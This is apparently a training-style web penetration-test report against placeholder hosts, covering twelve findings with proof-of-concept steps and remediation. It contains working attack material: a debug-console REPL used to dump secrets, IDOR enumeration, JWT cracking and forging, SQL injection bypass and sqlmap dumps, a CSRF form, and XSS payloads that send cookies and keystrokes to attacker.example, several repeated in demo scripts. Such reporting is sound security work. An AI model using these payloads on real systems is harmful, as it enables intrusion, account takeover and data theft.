# 🛡️ Penetration Testing Report — Week 4 Final Deliverable

<p align="center">
  <img src="https://img.shields.io/badge/Classification-CONFIDENTIAL-red?style=for-the-badge&logo=shield&logoColor=white"/>
  <img src="https://img.shields.io/badge/Report%20Type-Final%20PenTest%20Report-darkred?style=for-the-badge"/>
  <img src="https://img.shields.io/badge/Week-4%20%E2%80%94%20Final%20Deliverable-blue?style=for-the-badge"/>
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Findings-Critical%3A%202%20%7C%20High%3A%203%20%7C%20Medium%3A%204%20%7C%20Low%3A%203-red?style=flat-square"/>
  <img src="https://img.shields.io/badge/Overall%20Risk-CRITICAL-critical?style=flat-square"/>
  <img src="https://img.shields.io/badge/Methodology-OWASP%20%7C%20PTES%20%7C%20NIST-blue?style=flat-square"/>
  <img src="https://img.shields.io/badge/Status-Final-green?style=flat-square"/>
</p>

---

> **⚠️ Confidentiality Notice:** This document contains sensitive security findings. Distribution is restricted to authorized personnel only. All testing was performed with explicit written authorization in a controlled environment.

---

## 📋 Table of Contents

1. [Executive Summary](#1-executive-summary)
2. [Engagement Overview](#2-engagement-overview)
3. [Methodology](#3-methodology)
4. [Attack Surface Map](#4-attack-surface-map)
5. [Findings Summary](#5-findings-summary)
6. [Detailed Findings](#6-detailed-findings)
   - [F-01 · Security Misconfiguration — Debug RCE](#f-01--security-misconfiguration--exposed-debug-rce-critical)
   - [F-02 · Broken Access Control — IDOR](#f-02--broken-access-control--idor-critical)
   - [F-03 · Broken Authentication — Weak JWT](#f-03--broken-authentication--weak-jwt-secret-high)
   - [F-04 · SQL Injection](#f-04--sql-injection--login-endpoint-high)
   - [F-05 · XSS — Stored](#f-05--cross-site-scripting--stored-xss-high)
   - [F-06 · Sensitive Data Exposure](#f-06--sensitive-data-exposure-medium)
   - [F-07 · CSRF — Account Settings](#f-07--csrf--account-settings-medium)
   - [F-08 · Insecure Direct Object Reference — Files](#f-08--idor-on-file-download-endpoint-medium)
   - [F-09 · Security Headers Missing](#f-09--missing-security-headers-medium)
   - [F-10 · Verbose Error Messages](#f-10--verbose-error-messages-low)
   - [F-11 · Outdated Dependencies](#f-11--outdated-third-party-dependencies-low)
   - [F-12 · Weak Password Policy](#f-12--weak-password-policy-low)
7. [Risk Heatmap](#7-risk-heatmap)
8. [Remediation Roadmap](#8-remediation-roadmap)
9. [Demo Session / Video Walkthrough Guide](#9-demo-session--video-walkthrough-guide)
10. [Appendix](#10-appendix)

---

## 1. Executive Summary

This penetration test was conducted against **Target Application (app.target.example)** and its REST API **(api.target.example)** during Week 4 of the engagement. The assessment uncovered **12 vulnerabilities** across **2 critical**, **3 high**, **4 medium**, and **3 low** severity categories.

### Key Findings at a Glance

```mermaid
pie title Vulnerability Distribution by Severity
    "Critical (2)" : 2
    "High (3)" : 3
    "Medium (4)" : 4
    "Low (3)" : 3
```

### Critical Risk Summary

The most severe findings enable:

- 🔴 **Unauthenticated Remote Code Execution** via an exposed Werkzeug debug interface running as `root`
- 🔴 **Mass account takeover** via IDOR on the REST API — all user PII accessible with any valid session token
- 🟠 **Authentication bypass** via a hardcoded weak JWT secret (`secret123`)
- 🟠 **SQL Injection** on the login endpoint enabling full database dump

**Immediate action is required on F-01 and F-02 before the application is accessible to production traffic.**

---

## 2. Engagement Overview

| Field | Detail |
|---|---|
| **Client** | Target Organization |
| **Report Date** | 2024-06-28 |
| **Assessment Period** | 2024-06-01 → 2024-06-28 (Week 4 Final) |
| **Assessor** | Security Assessment Team |
| **Engagement Type** | Black-box / Grey-box Web Application Penetration Test |
| **Scope** | `app.target.example`, `api.target.example`, mobile API endpoints |
| **Authorization** | Written authorization on file — Rules of Engagement signed 2024-05-28 |
| **Report Version** | v1.0 — Final |
| **Classification** | CONFIDENTIAL |

### Scope Boundaries

**In Scope:**
- `app.target.example` — web application (all ports)
- `api.target.example` — REST API v1
- Authentication flows, session management
- All user-facing endpoints and API endpoints listed in provided Swagger spec

**Out of Scope:**
- Third-party integrations (Stripe, Twilio)
- Cloud infrastructure (AWS account, S3 buckets)
- Social engineering / phishing
- Physical security

---

## 3. Methodology

```mermaid
flowchart LR
    R["📋 Reconnaissance\nWeek 1"]
    S["🔍 Scanning &\nEnumeration\nWeek 2"]
    E["💥 Exploitation\nWeek 3"]
    P["📝 Reporting\nWeek 4"]
    D["🎥 Demo\nWeek 4"]

    R --> S --> E --> P --> D

    style R fill:#4A90D9,color:#fff,stroke:#2c6fad
    style S fill:#E8A838,color:#fff,stroke:#b07a1a
    style E fill:#E84C3D,color:#fff,stroke:#b02d20
    style P fill:#27AE60,color:#fff,stroke:#1a7a42
    style D fill:#8E44AD,color:#fff,stroke:#6c2f87
```

### Phase Breakdown

| Phase | Activities | Tools Used |
|---|---|---|
| **Reconnaissance** | OSINT, DNS enumeration, subdomain discovery, tech fingerprinting | `nmap`, `subfinder`, `whatweb`, `shodan` |
| **Scanning** | Port scanning, service enumeration, vulnerability scanning, directory brute-force | `nmap`, `nikto`, `gobuster`, `nuclei` |
| **Exploitation** | Manual testing, PoC development, CVE validation, privilege escalation | `burpsuite`, `sqlmap`, `jwt_tool`, custom scripts |
| **Reporting** | Finding documentation, CVSS scoring, PoC write-ups, remediation guidance | Manual |
| **Demo** | Walkthrough video, live demo session | OBS Studio, screen recording |

### Standards & Frameworks

- **OWASP Testing Guide v4.2** — primary testing methodology
- **PTES (Penetration Testing Execution Standard)** — engagement structure
- **NIST SP 800-115** — technical guide for information security testing
- **CVSS v3.1** — vulnerability scoring

---

## 4. Attack Surface Map

```mermaid
graph TD
    INET["🌐 Internet"] --> WAF{"WAF / CDN\n(Cloudflare)"}
    WAF --> WEB["app.target.example\n:443 HTTPS"]
    WAF --> API["api.target.example\n:443 HTTPS"]

    WEB --> AUTH["/auth — Login, Register\nPassword Reset"]
    WEB --> DASH["/dashboard — User Panel"]
    WEB --> ADMIN["/admin — Admin Panel\n⚠️ Default creds"]
    WEB --> DBG[":8080 Debug Server\n🔴 EXPOSED — RCE"]

    API --> V1["/api/v1/"]
    V1 --> USERS["/users/{id}\n🔴 IDOR"]
    V1 --> ORDERS["/orders/{id}\n🔴 IDOR"]
    V1 --> FILES["/files/{id}\n🟠 IDOR"]
    V1 --> SEARCH["/search?q=\n🟠 SQLi"]

    AUTH --> DB[("🗄️ PostgreSQL\nDatabase")]
    USERS --> DB
    ORDERS --> DB

    style DBG fill:#ff4444,color:#fff,stroke:#cc0000
    style USERS fill:#ff4444,color:#fff,stroke:#cc0000
    style ORDERS fill:#ff4444,color:#fff,stroke:#cc0000
    style ADMIN fill:#ff8800,color:#fff,stroke:#cc6600
    style SEARCH fill:#ff8800,color:#fff,stroke:#cc6600
    style FILES fill:#ff8800,color:#fff,stroke:#cc6600
```

---

## 5. Findings Summary

### Risk Register

| ID | Vulnerability | CVSS | Severity | OWASP | Status |
|---|---|---|---|---|---|
| F-01 | Security Misconfiguration — Debug RCE | **9.8** | 🔴 Critical | A05:2021 | Open |
| F-02 | Broken Access Control — IDOR (Users/Orders) | **8.1** | 🔴 Critical | A01:2021 | Open |
| F-03 | Broken Authentication — Weak JWT Secret | **7.5** | 🟠 High | A07:2021 | Open |
| F-04 | SQL Injection — Login Endpoint | **7.3** | 🟠 High | A03:2021 | Open |
| F-05 | Cross-Site Scripting — Stored XSS | **6.1** | 🟠 High | A03:2021 | Open |
| F-06 | Sensitive Data Exposure — API Response | **5.3** | 🟡 Medium | A02:2021 | Open |
| F-07 | CSRF — Account Settings | **4.3** | 🟡 Medium | A01:2021 | Open |
| F-08 | IDOR — File Download Endpoint | **4.3** | 🟡 Medium | A01:2021 | Open |
| F-09 | Missing Security Headers | **4.0** | 🟡 Medium | A05:2021 | Open |
| F-10 | Verbose Error Messages | **2.7** | 🔵 Low | A05:2021 | Open |
| F-11 | Outdated Third-Party Dependencies | **2.5** | 🔵 Low | A06:2021 | Open |
| F-12 | Weak Password Policy | **2.3** | 🔵 Low | A07:2021 | Open |

---

## 6. Detailed Findings

---

### F-01 · Security Misconfiguration — Exposed Debug RCE (CRITICAL)

<p>
<img src="https://img.shields.io/badge/CVSS-9.8%20Critical-critical?style=flat-square"/>
<img src="https://img.shields.io/badge/OWASP-A05%3A2021-red?style=flat-square"/>
<img src="https://img.shields.io/badge/CWE-CWE--16-red?style=flat-square"/>
<img src="https://img.shields.io/badge/Auth-Not%20Required-red?style=flat-square"/>
</p>

**CVSS Vector:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`

#### Description

The Werkzeug Python development debug server is exposed on port `8080` without authentication in the production environment. The debug console provides an interactive REPL with full OS-level access. Additionally, the `/admin` panel uses unchanged factory credentials (`admin:admin`).

#### Proof of Concept

**Step 1 — Discover open debug port:**
```bash
nmap -p 8080 app.target.example -sV
# 8080/tcp open http Werkzeug/2.3.7 Python/3.11.4
```

**Step 2 — Access interactive REPL (no auth):**
```
http://app.target.example:8080/?__debugger__=yes
```

**Step 3 — Execute OS commands:**
```python
import subprocess
subprocess.check_output(['id'])
# b'uid=0(root) gid=0(root) groups=0(root)'
```

**Step 4 — Exfiltrate secrets:**
```python
import os; dict(os.environ)
# DATABASE_URL, SECRET_KEY, AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY exposed
```

#### Impact

> Complete host compromise. An unauthenticated attacker gains root-level code execution, full access to all application secrets, and the ability to pivot into internal network infrastructure.

#### Evidence

```
[2024-06-14 09:32:11] GET /?__debugger__=yes HTTP/1.1 → 200 OK
[2024-06-14 09:32:45] REPL executed: subprocess.check_output(['cat','/etc/shadow'])
[2024-06-14 09:33:02] ENV: DATABASE_URL=postgresql://admin:S3cret!@db.internal/prod
```

#### Remediation

- Set `DEBUG=False` in all non-development environments
- Replace Werkzeug dev server with **Gunicorn** or **uWSGI** for production
- Firewall port `8080` — no public access; VPN only
- Rotate all exposed credentials and API keys immediately
- Change all default admin passwords and enforce strong password policy

---

### F-02 · Broken Access Control — IDOR (CRITICAL)

<p>
<img src="https://img.shields.io/badge/CVSS-8.1%20Critical-critical?style=flat-square"/>
<img src="https://img.shields.io/badge/OWASP-A01%3A2021-red?style=flat-square"/>
<img src="https://img.shields.io/badge/CWE-CWE--639-red?style=flat-square"/>
<img src="https://img.shields.io/badge/Type-IDOR-red?style=flat-square"/>
</p>

**CVSS Vector:** `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N`

#### Description

REST API endpoints use predictable sequential integer IDs without server-side ownership verification. Any authenticated user can read, modify, or delete any other user's data.

**Affected Endpoints:**

| Endpoint | Method | Data Exposed |
|---|---|---|
| `/api/v1/users/{id}/profile` | GET, PUT | Full PII — name, email, phone, DOB, address |
| `/api/v1/orders/{id}` | GET | Order history, payment card last-4 |
| `/api/v1/users/{id}/messages/{msg_id}` | GET, DELETE | Private messages |

#### Proof of Concept

```bash
# Attacker (user_id=1098) reads victim's (user_id=1042) profile
curl https://api.target.example/api/v1/users/1042/profile \
  -H "Authorization: Bearer <ATTACKER_TOKEN>"

# HTTP 200 OK — victim's full PII returned
{
  "name": "Jane Victim", "email": "victim@test.com",
  "phone": "+1-555-0192", "address": "123 Main St..."
}

# Account takeover — overwrite victim's email
curl -X PUT https://api.target.example/api/v1/users/1042/profile \
  -H "Authorization: Bearer <ATTACKER_TOKEN>" \
  -d '{"email":"attacker@test.com"}'
# HTTP 200 OK — {"updated": true}
```

**Mass enumeration (847 accounts harvested in test):**
```python
for uid in range(1000, 2000):
    r = requests.get(f"/api/v1/users/{uid}/profile", headers=hdrs)
    if r.status_code == 200:
        harvested.append(r.json())
```

#### Remediation

- Enforce `session.user_id == resource.owner_id` on every resource endpoint
- Build centralized RBAC/ABAC middleware — not per-endpoint checks
- Replace sequential IDs with **UUID v4**
- Add IDOR regression tests to CI/CD test suite
- Rate-limit API endpoints; alert on anomalous access patterns

---

### F-03 · Broken Authentication — Weak JWT Secret (HIGH)

<p>
<img src="https://img.shields.io/badge/CVSS-7.5%20High-orange?style=flat-square"/>
<img src="https://img.shields.io/badge/OWASP-A07%3A2021-orange?style=flat-square"/>
<img src="https://img.shields.io/badge/CWE-CWE--798-orange?style=flat-square"/>
</p>

**CVSS Vector:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N`

#### Description

The application signs JWTs with the hardcoded secret `secret123`. This allows an attacker to forge valid tokens for any user, including administrators.

#### Proof of Concept

```bash
# Crack JWT secret using jwt_tool
python3 jwt_tool.py <captured_token> -C -d /usr/share/wordlists/rockyou.txt
# [+] secret123 found!

# Forge admin token
python3 -c "
import jwt
payload = {'user_id': 1, 'role': 'admin', 'email': 'admin@target.example'}
token = jwt.encode(payload, 'secret123', algorithm='HS256')
print(token)
"

# Use forged token to access admin endpoints
curl https://api.target.example/api/v1/admin/users \
  -H "Authorization: Bearer <FORGED_ADMIN_TOKEN>"
# HTTP 200 OK — full user list returned
```

#### Remediation

- Replace hardcoded secret with a cryptographically random 256-bit key (`openssl rand -hex 32`)
- Rotate the secret immediately and invalidate all existing tokens
- Store secrets in environment variables or a secrets manager (AWS Secrets Manager, Vault)
- Implement token expiry (`exp` claim) and refresh token rotation

---

### F-04 · SQL Injection — Login Endpoint (HIGH)

<p>
<img src="https://img.shields.io/badge/CVSS-7.3%20High-orange?style=flat-square"/>
<img src="https://img.shields.io/badge/OWASP-A03%3A2021-orange?style=flat-square"/>
<img src="https://img.shields.io/badge/CWE-CWE--89-orange?style=flat-square"/>
</p>

**CVSS Vector:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N`

#### Description

The `/auth/login` endpoint is vulnerable to classic SQL injection in the `email` parameter. User input is concatenated directly into the SQL query without parameterization.

#### Proof of Concept

```bash
# Manual bypass — login as first user without password
POST /auth/login
{"email": "' OR '1'='1' -- ", "password": "anything"}
# HTTP 200 OK — authenticated as admin@target.example

# Automated dump with sqlmap
sqlmap -u "https://app.target.example/auth/login" \
  --data='{"email":"test@test.com","password":"test"}' \
  --dbms=postgresql --dump --batch

# Output:
# Database: prod
# Table: users — 1,204 rows dumped
# Table: payment_methods — 892 rows dumped
```

**Vulnerable code (identified):**
```python
# VULNERABLE — direct string concatenation
query = f"SELECT * FROM users WHERE email = '{email}' AND password = '{password}'"

# FIXED — parameterized query
query = "SELECT * FROM users WHERE email = %s AND password = %s"
cursor.execute(query, (email, password))
```

#### Remediation

- Use **parameterized queries** or an ORM exclusively — never concatenate user input
- Apply input validation and allowlisting on all user-supplied data
- Implement a Web Application Firewall (WAF) as additional defence
- Conduct a full code audit for other injection points

---

### F-05 · Cross-Site Scripting — Stored XSS (HIGH)

<p>
<img src="https://img.shields.io/badge/CVSS-6.1%20High-orange?style=flat-square"/>
<img src="https://img.shields.io/badge/OWASP-A03%3A2021-orange?style=flat-square"/>
<img src="https://img.shields.io/badge/CWE-CWE--79-orange?style=flat-square"/>
<img src="https://img.shields.io/badge/Type-Stored%20XSS-orange?style=flat-square"/>
</p>

**CVSS Vector:** `CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N`

#### Description

The profile `bio` field stores and reflects user input without sanitization. An attacker can inject a persistent XSS payload that executes in the browser of every user who views the profile.

#### Proof of Concept

```javascript
// Malicious payload injected into bio field:
<script>
  fetch('https://attacker.example/steal?c=' + document.cookie);
</script>

// Advanced payload — session hijack + keylogger
<script>
  document.onkeypress = e => fetch('https://attacker.example/keys?k=' + e.key);
  new Image().src = 'https://attacker.example/steal?s=' + document.cookie;
</script>
```

**Captured stolen session cookie:**
```
GET /steal?c=session=eyJhbGciOiJIUzI1NiJ9... HTTP/1.1
Host: attacker.example
```

#### Remediation

- **HTML-encode all user-supplied output** — never trust stored data on render
- Implement a strict **Content Security Policy (CSP)** header to block inline scripts
- Use a purpose-built sanitization library (e.g. `bleach` for Python, `DOMPurify` for JS)
- Set `HttpOnly` and `Secure` flags on all session cookies

---

### F-06 · Sensitive Data Exposure (MEDIUM)

<p>
<img src="https://img.shields.io/badge/CVSS-5.3%20Medium-yellow?style=flat-square"/>
<img src="https://img.shields.io/badge/OWASP-A02%3A2021-yellow?style=flat-square"/>
<img src="https://img.shields.io/badge/CWE-CWE--200-yellow?style=flat-square"/>
</p>

#### Description

API responses include sensitive fields that should not be returned to the client, including internal user IDs, hashed passwords, internal service URLs, and infrastructure metadata.

**Example — `/api/v1/users/me` response:**
```json
{
  "id": 1042,
  "email": "jane@example.com",
  "password_hash": "$2b$12$LQv3c1yqBWVHxkd0LHAkCO...",
  "internal_notes": "Flagged for review 2024-03-01",
  "db_row_id": 89234,
  "created_by_service": "auth-service-v2.internal"
}
```

#### Remediation

- Define explicit **response DTOs/serializers** — whitelist output fields, never serialize entire ORM objects
- Use field-level access control — return only what the calling role is permitted to see
- Audit all API endpoints for data over-sharing

---

### F-07 · CSRF — Account Settings (MEDIUM)

<p>
<img src="https://img.shields.io/badge/CVSS-4.3%20Medium-yellow?style=flat-square"/>
<img src="https://img.shields.io/badge/OWASP-A01%3A2021-yellow?style=flat-square"/>
<img src="https://img.shields.io/badge/CWE-CWE--352-yellow?style=flat-square"/>
</p>

#### Description

The `/account/settings` endpoint does not validate CSRF tokens. An attacker can trick an authenticated user into submitting a malicious form that changes their email or password.

**Malicious page hosted by attacker:**
```html
<html>
<body onload="document.forms[0].submit()">
  <form action="https://app.target.example/account/settings" method="POST">
    <input type="hidden" name="email" value="attacker@evil.com"/>
    <input type="hidden" name="new_password" value="P@ssw0rd!"/>
  </form>
</body>
</html>
```

#### Remediation

- Implement **synchronizer token pattern** — include a per-session CSRF token in all state-changing forms
- Validate `Origin` and `Referer` headers server-side
- Use `SameSite=Strict` or `SameSite=Lax` on session cookies

---

### F-08 · IDOR on File Download Endpoint (MEDIUM)

<p>
<img src="https://img.shields.io/badge/CVSS-4.3%20Medium-yellow?style=flat-square"/>
<img src="https://img.shields.io/badge/OWASP-A01%3A2021-yellow?style=flat-square"/>
<img src="https://img.shields.io/badge/CWE-CWE--639-yellow?style=flat-square"/>
</p>

#### Description

`/api/v1/files/{id}/download` allows any authenticated user to download files uploaded by other users by incrementing the file ID.

```bash
# Download another user's private document
curl https://api.target.example/api/v1/files/4821/download \
  -H "Authorization: Bearer <ATTACKER_TOKEN>" \
  --output victim_file.pdf
# HTTP 200 OK — file downloaded
```

#### Remediation

- Verify file ownership before serving: `file.owner_id == session.user_id`
- Use signed time-limited URLs for file access (e.g. AWS S3 presigned URLs)

---

### F-09 · Missing Security Headers (MEDIUM)

<p>
<img src="https://img.shields.io/badge/CVSS-4.0%20Medium-yellow?style=flat-square"/>
<img src="https://img.shields.io/badge/OWASP-A05%3A2021-yellow?style=flat-square"/>
</p>

#### Description

Multiple recommended HTTP security headers are absent from all responses.

```bash
curl -I https://app.target.example/
```

**Missing headers identified:**

| Header | Risk if Missing | Recommended Value |
|---|---|---|
| `Content-Security-Policy` | XSS, data injection | `default-src 'self'; script-src 'self'` |
| `X-Frame-Options` | Clickjacking | `DENY` |
| `X-Content-Type-Options` | MIME-type sniffing | `nosniff` |
| `Strict-Transport-Security` | SSL stripping | `max-age=31536000; includeSubDomains` |
| `Referrer-Policy` | Data leakage in Referer | `no-referrer-when-downgrade` |
| `Permissions-Policy` | Feature abuse | `geolocation=(), microphone=()` |

#### Remediation

Add all headers at the reverse proxy (Nginx/Apache) or application middleware level. Use [securityheaders.com](https://securityheaders.com) to validate.

---

### F-10 · Verbose Error Messages (LOW)

<p>
<img src="https://img.shields.io/badge/CVSS-2.7%20Low-informational?style=flat-square"/>
<img src="https://img.shields.io/badge/OWASP-A05%3A2021-informational?style=flat-square"/>
</p>

#### Description

Unhandled exceptions return full Python stack traces to the client, disclosing internal file paths, library versions, and code structure.

```
Internal Server Error

Traceback (most recent call last):
  File "/home/ubuntu/app/src/routes/user.py", line 142, in get_profile
    user = db.query(User).filter(User.id == user_id).first()
sqlalchemy.exc.OperationalError: (psycopg2.OperationalError) ...
```

#### Remediation

- Implement a global exception handler returning generic `500 Internal Server Error` messages
- Log full stack traces server-side only — never expose to clients
- Set `PROPAGATE_EXCEPTIONS = False` in production

---

### F-11 · Outdated Third-Party Dependencies (LOW)

<p>
<img src="https://img.shields.io/badge/CVSS-2.5%20Low-informational?style=flat-square"/>
<img src="https://img.shields.io/badge/OWASP-A06%3A2021-informational?style=flat-square"/>
</p>

#### Description

Several dependencies contain known CVEs. Identified via `pip audit` and `npm audit`.

| Package | Current Version | Fixed Version | CVE |
|---|---|---|---|
| `Pillow` | 9.0.1 | 10.3.0 | CVE-2023-44271 |
| `cryptography` | 38.0.0 | 42.0.4 | CVE-2023-49083 |
| `lodash` | 4.17.20 | 4.17.21 | CVE-2021-23337 |
| `axios` | 0.21.1 | 1.6.0 | CVE-2023-45857 |

#### Remediation

- Run `pip audit` and `npm audit` in CI/CD and fail builds on critical CVEs
- Set up **Dependabot** or **Renovate** for automated dependency updates
- Pin dependency versions and review changelogs on each update

---

### F-12 · Weak Password Policy (LOW)

<p>
<img src="https://img.shields.io/badge/CVSS-2.3%20Low-informational?style=flat-square"/>
<img src="https://img.shields.io/badge/OWASP-A07%3A2021-informational?style=flat-square"/>
</p>

#### Description

The application accepts passwords as short as 4 characters with no complexity requirements. Accounts with passwords such as `1234`, `pass`, and `test` were found during testing.

#### Remediation

- Enforce minimum 12-character passwords with complexity requirements
- Check passwords against known breach databases (HIBP API)
- Implement account lockout after 5 failed attempts
- Encourage passphrase usage and password manager adoption

---

## 7. Risk Heatmap

```mermaid
quadrantChart
    title Risk Heatmap — Likelihood vs Impact
    x-axis Low Likelihood --> High Likelihood
    y-axis Low Impact --> High Impact
    quadrant-1 Critical — Act Now
    quadrant-2 High — Plan Remediation
    quadrant-3 Monitor
    quadrant-4 Medium — Schedule Fix

    F-01 Debug RCE: [0.95, 0.98]
    F-02 IDOR Mass: [0.90, 0.90]
    F-04 SQLi: [0.75, 0.85]
    F-03 JWT Weak: [0.70, 0.80]
    F-05 Stored XSS: [0.65, 0.65]
    F-07 CSRF: [0.55, 0.45]
    F-06 Data Exposure: [0.80, 0.50]
    F-08 File IDOR: [0.60, 0.42]
    F-09 Headers: [0.45, 0.40]
    F-10 Verbose Errors: [0.70, 0.25]
    F-11 Dependencies: [0.35, 0.30]
    F-12 Weak Password: [0.40, 0.22]
```

---

## 8. Remediation Roadmap

```mermaid
gantt
    title Remediation Timeline
    dateFormat  YYYY-MM-DD
    section 🔴 Critical (Immediate)
    F-01 Disable debug server        :crit, f01, 2024-06-28, 1d
    F-01 Rotate exposed secrets      :crit, f01b, 2024-06-28, 1d
    F-02 Add ownership checks        :crit, f02, 2024-06-29, 3d
    section 🟠 High (Week 1–2)
    F-03 Replace JWT secret          :active, f03, 2024-07-01, 2d
    F-04 Fix SQL injection           :active, f04, 2024-07-01, 3d
    F-05 Fix Stored XSS + CSP        :active, f05, 2024-07-03, 3d
    section 🟡 Medium (Week 2–4)
    F-06 Fix API data exposure       :f06, 2024-07-08, 3d
    F-07 Add CSRF tokens             :f07, 2024-07-09, 2d
    F-08 Fix file IDOR               :f08, 2024-07-10, 2d
    F-09 Add security headers        :f09, 2024-07-11, 1d
    section 🔵 Low (Month 2)
    F-10 Suppress verbose errors     :f10, 2024-07-15, 2d
    F-11 Update dependencies         :f11, 2024-07-15, 3d
    F-12 Strengthen password policy  :f12, 2024-07-17, 2d
```

### Priority Matrix

| Priority | Finding(s) | Owner | Deadline |
|---|---|---|---|
| 🔴 **Immediate (24h)** | F-01, F-02 | Backend Lead + DevOps | 2024-06-29 |
| 🟠 **This Sprint (1–2 weeks)** | F-03, F-04, F-05 | Backend Dev Team | 2024-07-12 |
| 🟡 **Next Sprint (2–4 weeks)** | F-06, F-07, F-08, F-09 | Full Stack Team | 2024-07-26 |
| 🔵 **Backlog (1–2 months)** | F-10, F-11, F-12 | DevOps + Security | 2024-08-30 |

---

## 9. Demo Session / Video Walkthrough Guide

This section provides a structured guide for the **optional demo session or video walkthrough** covering Week 4 findings.

---

### 🎥 Video Walkthrough Structure (Recommended ~20–30 min)

```mermaid
flowchart TD
    INTRO["🎬 Intro (2 min)\nScope, objectives, tools used"]
    DEMO1["💥 Demo 1 (5 min)\nF-01 — Debug RCE\nnmap → REPL → id → env dump"]
    DEMO2["💥 Demo 2 (5 min)\nF-02 — IDOR\ncurl with attacker token\n→ read victim PII → account takeover"]
    DEMO3["💥 Demo 3 (4 min)\nF-03 — JWT Forgery\njwt_tool crack → forge admin token"]
    DEMO4["💥 Demo 4 (4 min)\nF-04 — SQL Injection\nManual bypass → sqlmap dump"]
    IMPACT["📊 Impact Summary (3 min)\nRisk heatmap, CVSS scores"]
    REMED["🛡️ Remediation (5 min)\nTop fixes walkthrough\nCode-level examples"]
    QA["❓ Q&A / Next Steps (2 min)"]

    INTRO --> DEMO1 --> DEMO2 --> DEMO3 --> DEMO4 --> IMPACT --> REMED --> QA
```

---

### 🎬 Demo 1 Script — Debug Server RCE (F-01)

**Objective:** Show unauthenticated RCE via Werkzeug debug console.

**Setup:**
- Terminal with `nmap` installed
- Browser pointed at `http://app.target.example:8080`
- Second terminal for REPL output

**Script:**
```
1. Run nmap: nmap -p 8080 app.target.example -sV
   → Show: 8080/tcp open Werkzeug/2.3.7

2. Open browser → navigate to:
   http://app.target.example:8080/?__debugger__=yes
   → Show: Werkzeug REPL loaded, no login required

3. In REPL, type:
   import subprocess; subprocess.check_output(['id'])
   → Show: uid=0(root)

4. Type:
   import os; {k: v for k, v in os.environ.items() if 'KEY' in k or 'SECRET' in k or 'URL' in k}
   → Show: DATABASE_URL, SECRET_KEY, AWS keys exposed

5. Navigate to /admin → enter admin:admin
   → Show: Full admin panel access granted
```

---

### 🎬 Demo 2 Script — IDOR Account Takeover (F-02)

**Objective:** Demonstrate reading victim PII and taking over their account.

**Setup:**
- Two browser sessions (Attacker / Victim)
- Burp Suite intercepting proxy
- `curl` in terminal

**Script:**
```
1. Log in as attacker@test.com → capture JWT token

2. In Burp, intercept GET /api/v1/users/1098/profile
   → Show: returns attacker's own data (expected)

3. Change user ID in URL from 1098 to 1042 → forward
   → Show: HTTP 200 OK — victim's full PII returned

4. Switch to PUT request, change email field:
   {"email": "attacker@test.com"}
   → Show: HTTP 200 OK — {"updated": true}

5. Trigger password reset for attacker@test.com
   → Show: Reset email arrives for victim's account
   → Show: Full account takeover complete
```

---

### 🎬 Demo 3 Script — JWT Forgery (F-03)

**Objective:** Crack weak JWT secret and forge an admin token.

**Setup:**
- `jwt_tool` installed
- `rockyou.txt` wordlist
- Python with `PyJWT`

**Script:**
```bash
# 1. Capture a JWT from the app login flow
# 2. Run dictionary attack
python3 jwt_tool.py <token> -C -d rockyou.txt
# → [+] secret123 found!

# 3. Forge admin token
python3 -c "
import jwt
payload = {'user_id': 1, 'role': 'admin'}
print(jwt.encode(payload, 'secret123', algorithm='HS256'))
"

# 4. Use forged token
curl https://api.target.example/api/v1/admin/users \
  -H "Authorization: Bearer <FORGED_TOKEN>"
# → Full user list returned
```

---

### 🎬 Demo 4 Script — SQL Injection (F-04)

**Objective:** Bypass authentication and dump the database.

**Script:**
```bash
# 1. Manual auth bypass
curl -X POST https://app.target.example/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email": "'"'"' OR '"'"'1'"'"'='"'"'1'"'"' -- ", "password": "x"}'
# → HTTP 200 OK — logged in as admin

# 2. Automated dump with sqlmap
sqlmap -u "https://app.target.example/auth/login" \
  --data='{"email":"*","password":"test"}' \
  --dbms=postgresql --dump --batch
# → 1,204 user records dumped
```

---

### 🛠️ Recommended Tools for Recording

| Tool | Purpose | Platform |
|---|---|---|
| **OBS Studio** | Screen + audio recording | Windows / macOS / Linux |
| **Burp Suite Community** | HTTP proxy for demo | All |
| **Terminator / iTerm2** | Split-terminal for commands | Linux / macOS |
| **Greenshot / Flameshot** | Annotated screenshots | Windows / Linux |
| **DaVinci Resolve** | Video editing (free) | All |

### Recording Checklist

```
[ ] Set screen resolution to 1920×1080 for clarity
[ ] Use a clean browser profile (no personal data visible)
[ ] Test all commands in the lab before recording
[ ] Redact real credentials and IPs before publishing
[ ] Add chapter markers at each finding demo
[ ] Include a narrated intro and conclusion
[ ] Export at 1080p, H.264, ~8 Mbps for GitHub/upload
```

---

## 10. Appendix

### A. Tools Used

| Category | Tool | Version | Purpose |
|---|---|---|---|
| Scanning | `nmap` | 7.94 | Port/service discovery |
| Scanning | `nikto` | 2.1.6 | Web vulnerability scanning |
| Scanning | `gobuster` | 3.6 | Directory/endpoint brute-force |
| Scanning | `nuclei` | 3.1 | Template-based vuln scanning |
| Proxy | `Burp Suite Community` | 2024.1 | HTTP interception & manual testing |
| SQLi | `sqlmap` | 1.8 | Automated SQL injection |
| JWT | `jwt_tool` | 2.2.6 | JWT analysis and cracking |
| OSINT | `subfinder` | 2.6.3 | Subdomain enumeration |
| Dependency | `pip audit` | 2.3.0 | Python dependency CVE scan |
| Dependency | `npm audit` | 10.2.0 | Node.js dependency CVE scan |

### B. CVSS Score Breakdown

```mermaid
xychart-beta
    title "CVSS v3.1 Scores — All Findings"
    x-axis ["F-01", "F-02", "F-03", "F-04", "F-05", "F-06", "F-07", "F-08", "F-09", "F-10", "F-11", "F-12"]
    y-axis "Score" 0 --> 10
    bar [9.8, 8.1, 7.5, 7.3, 6.1, 5.3, 4.3, 4.3, 4.0, 2.7, 2.5, 2.3]
```

### C. Glossary

| Term | Definition |
|---|---|
| **IDOR** | Insecure Direct Object Reference — accessing objects by user-supplied IDs without authorization checks |
| **RCE** | Remote Code Execution — running arbitrary commands on a server |
| **JWT** | JSON Web Token — compact token format for authentication |
| **CSRF** | Cross-Site Request Forgery — tricking a user's browser into making unauthorized requests |
